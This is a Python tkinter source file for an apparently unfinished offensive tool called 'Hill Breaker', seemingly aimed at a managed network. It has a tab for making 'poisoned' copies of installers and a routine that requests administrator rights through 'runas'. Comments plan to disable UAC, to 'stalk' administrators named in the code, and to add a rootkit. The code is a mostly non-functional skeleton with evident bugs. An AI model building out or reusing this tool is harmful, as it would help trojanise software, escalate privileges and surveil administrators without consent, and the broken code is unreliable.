import tkinter
from tkinter import messagebox, Frame, ttk, LabelFrame, Label, Button, filedialog #.ttk and tkinter widgets are diffrent, headache
import loggermain, Jacker, LightspeedOff
from ctypes import windll
from sys import executable, argv
from os import getlogin

c = (windll.shell32)
installer = ""

def Main():
    root = tkinter.Tk()
    root.geometry('525x700')
    root.title("Hill Breaker")

    #Tabs
    tab = ttk.Notebook(root)

    home = Frame(tab,padx=10,pady=10,bg='#999999')
    hijacking = Frame(tab,padx=10,pady=10,bg='#999999')
    controls = Frame(tab,padx=10,pady=10,bg='#999999')
    
    tab.add(home, text='Home')
    tab.add(hijacking, text='Hijacking')
    tab.add(controls, text='Controls')

    tab.pack(expand=1, fill='both')

    #Home
    admin = LabelFrame(home,text="Elevation Status",padx=10,pady=10,bg='#888888',borderwidth=5)
    status = Label(admin,text="Program is not currently elevated.",bg='#888888').pack(anchor='nw')

    if c.IsUserAnAdmin(): # Can probably do this all with a text variable and returns and blah blah
        status.config(text="Program is running as elevated under " + getlogin()) # Probably better to just not do this in python
        elevate.config(disabled=1)
    admin.pack(anchor='nw')

    elevate = Button(admin,text="Elevate",command=Elevate,borderwidth=5).pack(anchor='nw')

    #Hijacker - Create fake installers, etc
    uploader = LabelFrame(hijacking,text="Create Installer",padx=10,pady=10,bg='#888888',borderwidth=5)
    info = Label(uploader,text="Upload installer file to create poisoned copy.",bg='#888888').pack(anchor='nw')
    uploadfile = Button(uploader,text="Upload file",command=Upload,borderwidth=5).pack(anchor='nw')
    uploader.pack(anchor='nw')

    poisonOptions = LabelFrame(hijacking,text="Options",padx=10,pady=10,bg='#888888',borderwidth=5)
    selected = Label(poisonOptions,text="Selected: ",bg='#888888').pack(anchor='nw')
    poisonOptions.pack(anchor='nw')

    #Controller - Control local system, disable UAC, etc

    #Stalker - "stalk" admins and admin logs, i.e "tdoyle has logged in at __" "cevans has done __"

    #Roots - Rootkit when?

    root.mainloop()

def Upload():
    installer = filedialog.askopenfilename()
    

def Elevate():
    c.ShellExecuteW(None, 'runas', executable, ' '.join(argv), None, None) # Creates new program, BUT DOESNT STOP OLD ONE
    if c.IsUserAnAdmin():
        quit() # After new elevated script is running, Keep Yourself Safe #03
    else:
        messagebox.showerror(title='Hill Breaker', message='Failed to elevate program.')
    
if __name__ == "__main__":
    windll.shcore.SetProcessDpiAwareness(1) #Blurry fonts - https://stackoverflow.com/questions/41315873

        
    Main()